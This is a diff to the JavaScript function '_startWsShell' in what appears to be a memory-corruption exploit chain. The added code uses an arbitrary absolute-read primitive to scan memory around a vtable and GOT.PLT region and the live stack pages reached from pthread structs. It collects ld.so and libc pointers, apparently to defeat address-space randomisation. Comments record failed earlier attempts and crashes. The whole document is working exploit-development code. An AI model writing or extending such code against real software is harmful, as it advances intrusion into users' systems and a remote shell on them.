@@ -6262,6 +6262,28 @@ function _startWsShell(){
               }
             }
           }catch(eW9){LB('a walk fault');}
+          /* (2b) THE VP-NEIGHBORHOOD SCAN (session-171 idea #1): VP is in
+          * .data.rel.ro - a region of vtables + the GOT.PLT (their p691:
+          * the resolver + resolved entries at VP+0x2000..0x4000 - THEIR
+          * window; OURS never scanned - the v5 attempt died at the wrong
+          * constant). Scan [VP-0x8000, VP+0x10000): the resolver slots
+          * hold LD.SO pointers; resolved slots may hold import targets
+          * (libc-class). All in the readable rodata neighborhood. */
+          try{
+            if(reply.VP){
+              var VPv=BigInt(reply.VP);
+              for(var offV=-0x8000;offV<0x10000;offV+=0x1000){
+                var av=VPv+BigInt(offV);
+                try{
+                  var wv=S.absRead(av,0x1000);
+                  for(var iv=0;iv<wv.length;iv++)addF(wv[iv]);
+                }catch(eV9){}
+                if((offV&0x3FFF)===0)LB('v win '+(offV<0?'-':'+')+'0x'+Math.abs(offV).toString(16));
+              }
+              LB('v VP window scanned, pool n='+foreign9.length);
+            }
+          }catch(eVw){LB('v window fault');}
+
           /* (3) THE PTHREAD-STRUCT WALK (session-170 lesson: the harvest's
              * 0x88-band values include STALE structs - struct #2 killed
              * the session. THE LIVE CHAIN instead: struct pthread's own
@@ -6292,8 +6314,22 @@ function _startWsShell(){
                   /* the module-band function pointers -> the pool */
                   addF(v9q);
                 }
-                ptLinks.push('0x'+P9.toString(16));
+                ptLinks.push('0x'+P9.toString(16)+'+'+st9.filter(function(x){return x>=0x700000000n&&x<0x800000000n;}).length+'stk');
                 LB('h struct 0x'+P9.toString(16)+' scanned q='+queue9.length);
+                /* the stack pointers (0x7ef-band) -> scan the LIVE top page */
+                for(var si9=0;si9<st9.length;si9++){
+                  var sv9=st9[si9];
+                  if(sv9>=0x700000000n&&sv9<0x800000000n&&(sv9&0xFFFn)===0n){
+                    var kSt9=sv9.toString(16);
+                    if(scanned9['S'+kSt9])continue;
+                    scanned9['S'+kSt9]=1;
+                    try{
+                      var sw9=S.absRead(sv9-0x1000n,0x1000);
+                      for(var swi9=0;swi9<sw9.length;swi9++)addF(sw9[swi9]);
+                      LB('s stack 0x'+sv9.toString(16)+' scanned');
+                    }catch(eSt9){LB('s stack 0x'+sv9.toString(16)+' fail');}
+                  }
+                }
               }catch(eS9){LB('h struct 0x'+P9.toString(16)+' read fail');}
             }
             reply.ptScanned=ptLinks;
